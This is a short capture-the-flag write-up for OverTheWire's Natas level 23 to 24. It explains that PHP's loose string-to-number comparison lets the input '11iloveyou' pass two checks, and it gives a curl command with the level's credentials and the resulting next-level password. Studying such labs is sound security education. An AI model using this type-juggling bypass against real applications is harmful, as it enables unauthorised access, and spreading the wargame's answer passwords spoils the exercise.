# Natas Level 23 to 24

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 23 -> 24 |
| Status | Complete |

## Objective

Pass a loose PHP string and numeric comparison.

## Given Access

User: `natas23`

Password:

```text
dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs
```

## Method

The app checks that the password contains `iloveyou` and that the same value is greater than `10`. PHP converts strings beginning with digits to numbers for loose numeric comparison, so `11iloveyou` satisfies both checks.

## Commands

```bash
curl -s -u natas23:dIUQcI3uSus1JEOSSWRAEXBG8KbR8tRs \
  --get \
  --data-urlencode 'passwd=11iloveyou' \
  http://natas23.natas.labs.overthewire.org/
```

## Result

Password for `natas24`:

```text
MeuqmfJ8DDKuTr5pcvzFKSwlxedZYEWd
```

## Lesson

Loose comparisons can mix string and numeric semantics in surprising ways. Strict validation and strict comparisons avoid this class of bug.

## References

- https://overthewire.org/wargames/natas/
